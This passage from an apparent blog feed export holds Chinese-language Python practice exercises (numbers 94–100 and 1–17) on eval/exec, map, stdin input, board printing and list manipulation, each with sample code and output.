<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test94</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"begin test 94"</span>)</span><br><span class="line">    print(<span class="string">"eval('(2+3)*5') = &#123;0&#125;"</span>.format(eval(<span class="string">'(2+3)*5'</span>)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    begin test <span class="number">94</span></span><br><span class="line">    eval(<span class="string">'(2+3)*5'</span>) = <span class="number">25</span></span><br></pre></td></tr></table></figure>

<p>95、实现字符串 ‘x={“name”:“David”, “age”:18}’ 包含的代码功能</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test95</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"begin test 95"</span>)</span><br><span class="line">    <span class="comment"># 命令行启动</span></span><br><span class="line">    <span class="comment"># x = None</span></span><br><span class="line">    <span class="comment"># print("ori x = &#123;0&#125;".format(x))</span></span><br><span class="line">    <span class="comment"># exec('x = &#123;"name":"David", "age":18&#125;')</span></span><br><span class="line">    <span class="comment"># print("res x = &#123;0&#125;".format(x))</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># right</span></span><br><span class="line">    <span class="comment"># Python 3.7.5 (default, Dec  8 2019, 20:58:39) </span></span><br><span class="line">    <span class="comment"># [GCC 6.3.0 20170516] on linux</span></span><br><span class="line">    <span class="comment"># Type "help", "copyright", "credits" or "license" for more information.</span></span><br><span class="line">    <span class="comment"># &gt;&gt;&gt; exec('x = &#123;"name":"David", "age":18&#125;')</span></span><br><span class="line">    <span class="comment"># &gt;&gt;&gt; x</span></span><br><span class="line">    <span class="comment"># &#123;'name': 'David', 'age': 18&#125;</span></span><br></pre></td></tr></table></figure>

<p>96、使用 map 函数求列表 [2,3,4,5] 中每个元素的立方根</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test96</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"begin test 96"</span>)</span><br><span class="line">    test_list = [<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>]</span><br><span class="line">    print(<span class="string">"test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    print(<span class="string">"res_test = &#123;0&#125;"</span>.format(list(map(<span class="keyword">lambda</span> x:pow(x, <span class="number">1</span>/<span class="number">3</span>), test_list))))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    test_list = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line">    res_test = [<span class="number">1.2599210498948732</span>, <span class="number">1.4422495703074083</span>, <span class="number">1.5874010519681994</span>, <span class="number">1.7099759466766968</span>]</span><br></pre></td></tr></table></figure>

<p>97、使用 sys.stdin.readline() 写一个和 input() 函数功能完全相同的函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test97</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"begin test 97"</span>)</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">my_input</span><span class="params">(prompt)</span>:</span></span><br><span class="line">        print(prompt, end = <span class="string">''</span>)</span><br><span class="line">        <span class="keyword">return</span> sys.stdin.readline().strip()</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># str_input = my_input('')</span></span><br><span class="line">    <span class="comment"># print("str_input = &#123;0&#125;".format(str_input))</span></span><br><span class="line">    <span class="comment"># &gt;&gt;</span></span><br><span class="line">    <span class="comment">#   my_input</span></span><br><span class="line">    <span class="comment">#   str_input = test_input</span></span><br></pre></td></tr></table></figure>

<p>98、使用二维列表描述9x9围棋局面，’w’表示白色棋子，‘b’表示黑色棋子，’-‘表示无子，打印文本棋盘</p>
<p><img data-src="./python100-10/1.png" alt></p>
<p>99、对于9x9围棋盘，用a-i标识各行，用1-9标识各列，设计函数go()，输入位置和颜色，即输出文本棋盘，模拟围棋对弈的过程</p>
<p><img data-src="./python100-10/2.png" alt></p>
<p>100、下图中是国际跳棋的初始局面，10x10的棋盘上只有50个深色格子可以落子，’w’表示白色棋子，‘b’表示黑色棋子，’-‘表示无子，字符串 phase = ‘b’<em>20 + ‘-’</em>10 + ‘w’*20 表示下图中的局面，请将 phase 打印成下图右所示的样子</p>
<p><img data-src="./python100-10/3.png" alt></p>
]]></content>
      <categories>
        <category>python语感专项</category>
      </categories>
      <tags>
        <tag>python语感</tag>
        <tag>others</tag>
      </tags>
  </entry>
  <entry>
    <title>python语感专项-1</title>
    <url>/2020/02/11/blog_formal/%E5%BC%80%E5%8F%91/python/python100-1/</url>
    <content><![CDATA[<h1 id="python语感专项"><a href="#python语感专项" class="headerlink" title="python语感专项"></a>python语感专项</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>和我们学习任何一门语言一样，一个很重要的点就是培养语感，本文来自互联网整理+自己的见解</p>
<a id="more"></a>

<h2 id="第一拍"><a href="#第一拍" class="headerlink" title="第一拍"></a>第一拍</h2><p>1、将元组(1,2,3)和集合{4,5,6}合并成一个列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test1</span><span class="params">()</span>:</span></span><br><span class="line">    list_a = list(&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;)</span><br><span class="line">    list_b = list((<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>))</span><br><span class="line">    print(<span class="string">"list_a = &#123;0&#125;"</span>.format(list_a))</span><br><span class="line">    print(<span class="string">"list_b = &#123;0&#125;"</span>.format(list_b))</span><br><span class="line">    print(<span class="string">"list_a + list_b = &#123;0&#125;"</span>.format(list_a+list_b))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    list_a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">    list_b = [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">    list_a + list_b = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br></pre></td></tr></table></figure>

<p>2、在列表[1,2,3,4,5,6]首尾分别添加整型元素7和0</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test2</span><span class="params">()</span>:</span></span><br><span class="line">    list_test = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line">    list_test.append(<span class="number">0</span>)</span><br><span class="line">    print(<span class="string">"list_test = (0)"</span>.format(list_test))</span><br><span class="line">    list_test.insert(<span class="number">0</span>, <span class="number">7</span>)   </span><br><span class="line">    print(<span class="string">"list_test = &#123;0&#125;"</span>.format(list_test))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    list_test = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">0</span>]</span><br><span class="line">    list_test = [<span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">0</span>]</span><br></pre></td></tr></table></figure>

<p>3、反转列表[0,1,2,3,4,5,6,7]</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test3</span><span class="params">()</span>:</span></span><br><span class="line">    list_test = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]</span><br><span class="line">    print(<span class="string">"origin list = &#123;0&#125;"</span>.format(list_test))</span><br><span class="line">    list_test.reverse()</span><br><span class="line">    print(<span class="string">"reverse list = &#123;0&#125;"</span>.format(list_test))</span><br><span class="line">    print(<span class="string">"reverse2 list = &#123;0&#125;"</span>.format(list_test[::<span class="number">-1</span>]))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    origin list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line">    reverse list = [<span class="number">7</span>, <span class="number">6</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line">    reverse2 list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br></pre></td></tr></table></figure>

<p>4、反转列表[0,1,2,3,4,5,6,7]后给出元素5的索引号</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test4</span><span class="params">()</span>:</span></span><br><span class="line">    test_list = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>]</span><br><span class="line">    print(<span class="string">"origin 5 index = &#123;0&#125;"</span>.format(test_list.index(<span class="number">5</span>)))</span><br><span class="line">    print(<span class="string">"5 index = &#123;0&#125;"</span>.format(test_list[::<span class="number">-1</span>].index(<span class="number">5</span>)))</span><br><span class="line">    test_list.append(<span class="number">5</span>)</span><br><span class="line">    test_list.insert(<span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line">    print(<span class="string">"test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    print(<span class="string">"aft 5 index = &#123;0&#125;"</span>.format(test_list.index(<span class="number">5</span>)))</span><br><span class="line">    print(<span class="string">"type index = &#123;0&#125;"</span>.format(type(test_list.index(<span class="number">5</span>))))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    origin <span class="number">5</span> index = <span class="number">4</span></span><br><span class="line">    <span class="number">5</span> index = <span class="number">2</span></span><br><span class="line">    test_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">5</span>]</span><br><span class="line">    aft <span class="number">5</span> index = <span class="number">3</span></span><br><span class="line">    type index = &lt;<span class="class"><span class="keyword">class</span> '<span class="title">int</span>'&gt;</span></span><br></pre></td></tr></table></figure>

<p>5、分别统计列表 [True,False,0,1,2] 中 True,False,0,1,2的元素个数，发现了什么？</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test5</span><span class="params">()</span>:</span></span><br><span class="line">    test_list = [<span class="literal">False</span>, <span class="literal">True</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">    print(<span class="string">"origin list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    print(<span class="string">"counts = &#123;0&#125;, &#123;1&#125;, &#123;2&#125;, &#123;3&#125;, &#123;4&#125;"</span>.format(test_list.count(<span class="literal">False</span>), 		  test_list.count(<span class="literal">True</span>), test_list.count(<span class="number">0</span>), test_list.count(<span class="number">1</span>), test_list.count(<span class="number">2</span>)))</span><br><span class="line">    test_list.insert(<span class="number">0</span>, <span class="literal">None</span>)</span><br><span class="line">    test_list.insert(<span class="number">0</span>, <span class="string">''</span>)</span><br><span class="line">    print(<span class="string">"aft list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    print(<span class="string">"count False = &#123;0&#125;"</span>.format(test_list.count(<span class="literal">False</span>)))</span><br><span class="line">    print(<span class="string">"count None = &#123;0&#125;"</span>.format(test_list.count(<span class="literal">None</span>)))</span><br><span class="line">    print(<span class="string">"count '' = &#123;0&#125;"</span>.format(test_list.count(<span class="string">''</span>)))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    origin list = [<span class="literal">False</span>, <span class="literal">True</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">    counts = <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span></span><br><span class="line">    aft list = [<span class="string">''</span>, <span class="literal">None</span>, <span class="literal">False</span>, <span class="literal">True</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line">    count <span class="literal">False</span> = <span class="number">2</span></span><br><span class="line">    count <span class="literal">None</span> = <span class="number">1</span></span><br><span class="line">    count <span class="string">''</span> = <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>备注：count()不区分True和1、False和0，但None、’’、””不会被视为False</p>
<p>6、从列表 [True,1,0,‘x’,None,‘x’,False,2,True] 中删除元素‘x’</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test6</span><span class="params">()</span>:</span></span><br><span class="line">    test_list =  [<span class="literal">True</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="string">'x'</span>, <span class="literal">None</span>, <span class="string">'x'</span>, <span class="literal">False</span>, <span class="number">2</span>, <span class="literal">True</span>]</span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(test_list.count(<span class="string">'x'</span>)):</span><br><span class="line">        test_list.remove(<span class="string">'x'</span>)</span><br><span class="line">    print(<span class="string">"aft test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_list = [<span class="literal">True</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="string">'x'</span>, <span class="literal">None</span>, <span class="string">'x'</span>, <span class="literal">False</span>, <span class="number">2</span>, <span class="literal">True</span>]</span><br><span class="line">    aft test_list = [<span class="literal">True</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="literal">None</span>, <span class="literal">False</span>, <span class="number">2</span>, <span class="literal">True</span>]</span><br></pre></td></tr></table></figure>

<p>7、从列表 [True,1,0,‘x’,None,‘x’,False,2,True] 中删除索引号为4的元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test7</span><span class="params">()</span>:</span></span><br><span class="line">    test_list =  [<span class="literal">True</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="string">'x'</span>, <span class="literal">None</span>, <span class="string">'x'</span>, <span class="literal">False</span>, <span class="number">2</span>, <span class="literal">True</span>]</span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    test_list.pop(<span class="number">4</span>)</span><br><span class="line">    print(<span class="string">"aft test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span></span><br><span class="line">    ori test_list = [<span class="literal">True</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="string">'x'</span>, <span class="literal">None</span>, <span class="string">'x'</span>, <span class="literal">False</span>, <span class="number">2</span>, <span class="literal">True</span>]</span><br><span class="line">    aft test_list = [<span class="literal">True</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="string">'x'</span>, <span class="string">'x'</span>, <span class="literal">False</span>, <span class="number">2</span>, <span class="literal">True</span>]</span><br></pre></td></tr></table></figure>

<p>8、删除列表中索引号为奇数（或偶数）的元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test8</span><span class="params">()</span>:</span></span><br><span class="line">    test_list = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    <span class="keyword">del</span> test_list[::<span class="number">2</span>]</span><br><span class="line">    print(<span class="string">"aft test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    </span><br><span class="line">    test_list = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    <span class="keyword">del</span> test_list[<span class="number">1</span>::<span class="number">2</span>]</span><br><span class="line">    print(<span class="string">"aft test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_list = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line">    aft test_list = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>]</span><br><span class="line">    ori test_list = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line">    aft test_list = [<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]</span><br></pre></td></tr></table></figure>

<p>9、清空列表中的所有元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test9</span><span class="params">()</span>:</span></span><br><span class="line">    test_list = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    test_list.clear()</span><br><span class="line">    print(<span class="string">"aft test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_list = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line">    aft test_list = []</span><br></pre></td></tr></table></figure>

<p>10、对列表 [3,0,8,5,7] 分别做升序和降序排列</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test10</span><span class="params">()</span>:</span></span><br><span class="line">    test_list = [<span class="number">3</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">7</span>]</span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    test_list.sort()</span><br><span class="line">    print(<span class="string">"aft test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    </span><br><span class="line">    test_list = [<span class="number">3</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">7</span>]</span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    test_list.sort(reverse = <span class="literal">True</span>)</span><br><span class="line">    print(<span class="string">"aft test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_list = [<span class="number">3</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">7</span>]</span><br><span class="line">    aft test_list = [<span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">8</span>]</span><br><span class="line">    ori test_list = [<span class="number">3</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">7</span>]</span><br><span class="line">    aft test_list = [<span class="number">8</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">0</span>]</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python语感专项</category>
      </categories>
      <tags>
        <tag>python语感</tag>
        <tag>others</tag>
      </tags>
  </entry>
  <entry>
    <title>python语感专项-2</title>
    <url>/2020/02/12/blog_formal/%E5%BC%80%E5%8F%91/python/python100-2/</url>
    <content><![CDATA[<h1 id="python语感专项"><a href="#python语感专项" class="headerlink" title="python语感专项"></a>python语感专项</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>和我们学习任何一门语言一样，一个很重要的点就是培养语感，本文来自互联网整理+自己的见解</p>
<a id="more"></a>

<h2 id="第二拍"><a href="#第二拍" class="headerlink" title="第二拍"></a>第二拍</h2><p>11、将列表 [3,0,8,5,7] 中大于 5 元素置为1，其余元素置为0</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test11</span><span class="params">()</span>:</span></span><br><span class="line">    test_list = [<span class="number">3</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">7</span>]</span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    test_list = [<span class="number">1</span> <span class="keyword">if</span> x &gt; <span class="number">5</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> x <span class="keyword">in</span> test_list]</span><br><span class="line">    print(<span class="string">"aft test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_list = [<span class="number">3</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">7</span>]</span><br><span class="line">    aft test_list = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>]</span><br></pre></td></tr></table></figure>

<p>12、遍历列表 [‘x’,‘y’,‘z’]，打印每一个元素及其对应的索引号</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test12</span><span class="params">()</span>:</span></span><br><span class="line">    test_list = [<span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>]</span><br><span class="line">    <span class="keyword">for</span> i, v <span class="keyword">in</span> enumerate(test_list):</span><br><span class="line">        print(<span class="string">"index = &#123;0&#125; value = &#123;1&#125;"</span>.format(i, v))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    index = <span class="number">0</span> value = x</span><br><span class="line">    index = <span class="number">1</span> value = y</span><br><span class="line">    index = <span class="number">2</span> value = z</span><br></pre></td></tr></table></figure>

<p>13、将列表 [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] 拆分为奇数组和偶数组两个列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test13</span><span class="params">()</span>:</span></span><br><span class="line">    test_list = [<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]</span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    print(<span class="string">"res test_list1 = &#123;0&#125;"</span>.format(test_list[::<span class="number">2</span>]))    </span><br><span class="line">    print(<span class="string">"res test_list2 = &#123;0&#125;"</span>.format(test_list[<span class="number">1</span>::<span class="number">2</span>]))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_list = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>]</span><br><span class="line">    res test_list1 = [<span class="number">0</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">8</span>]</span><br><span class="line">    res test_list2 = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>]</span><br></pre></td></tr></table></figure>

<p>14、分别根据每一行的首元素和尾元素大小对二维列表 [[6, 5], [3, 7], [2, 8]] 排序</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test14</span><span class="params">()</span>:</span></span><br><span class="line">    test_list = [[<span class="number">6</span>,<span class="number">5</span>],[<span class="number">3</span>,<span class="number">7</span>],[<span class="number">2</span>,<span class="number">8</span>]]</span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    test_list = sorted(test_list, key=<span class="keyword">lambda</span> x:x[<span class="number">0</span>])</span><br><span class="line">    print(<span class="string">"res test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line"></span><br><span class="line">    test_list = [[<span class="number">6</span>,<span class="number">5</span>],[<span class="number">3</span>,<span class="number">7</span>],[<span class="number">2</span>,<span class="number">8</span>]]</span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    test_list = sorted(test_list, key=<span class="keyword">lambda</span> x:x[<span class="number">-1</span>])</span><br><span class="line">    print(<span class="string">"res test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_list = [[<span class="number">6</span>, <span class="number">5</span>], [<span class="number">3</span>, <span class="number">7</span>], [<span class="number">2</span>, <span class="number">8</span>]]</span><br><span class="line">    res test_list = [[<span class="number">2</span>, <span class="number">8</span>], [<span class="number">3</span>, <span class="number">7</span>], [<span class="number">6</span>, <span class="number">5</span>]]</span><br><span class="line">    ori test_list = [[<span class="number">6</span>, <span class="number">5</span>], [<span class="number">3</span>, <span class="number">7</span>], [<span class="number">2</span>, <span class="number">8</span>]]</span><br><span class="line">    res test_list = [[<span class="number">6</span>, <span class="number">5</span>], [<span class="number">3</span>, <span class="number">7</span>], [<span class="number">2</span>, <span class="number">8</span>]]</span><br></pre></td></tr></table></figure>

<p>15、从列表 [1,4,7,2,5,8] 索引为3的位置开始，依次插入列表 [‘x’,‘y’,‘z’] 的所有元素</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test15</span><span class="params">()</span>:</span></span><br><span class="line">    test_list = [<span class="number">1</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">5</span>,<span class="number">8</span>]</span><br><span class="line">    print(<span class="string">"ori test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">    <span class="comment">#test_list.insert(3, ['x', 'y', 'z']) # error</span></span><br><span class="line">    test_list[<span class="number">3</span>:<span class="number">3</span>] = [<span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>]</span><br><span class="line">    print(<span class="string">"aft test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    ori test_list = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>]</span><br><span class="line">    aft test_list = [<span class="number">1</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="string">'x'</span>, <span class="string">'y'</span>, <span class="string">'z'</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>]</span><br></pre></td></tr></table></figure>

<p>16、快速生成由 [5,50) 区间内的整数组成的列表</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test16</span><span class="params">()</span>:</span></span><br><span class="line">    test_list = list(range(<span class="number">5</span>,<span class="number">50</span>))</span><br><span class="line">    print(<span class="string">"res test_list = &#123;0&#125;"</span>.format(test_list))</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line">    res test_list = [<span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">34</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">37</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">43</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>]</span><br></pre></td></tr></table></figure>

<p>17、若 a = [1,2,3]，令 b = a，执行 b[0] = 9， a[0]亦被改变。为何？如何避免？</p>
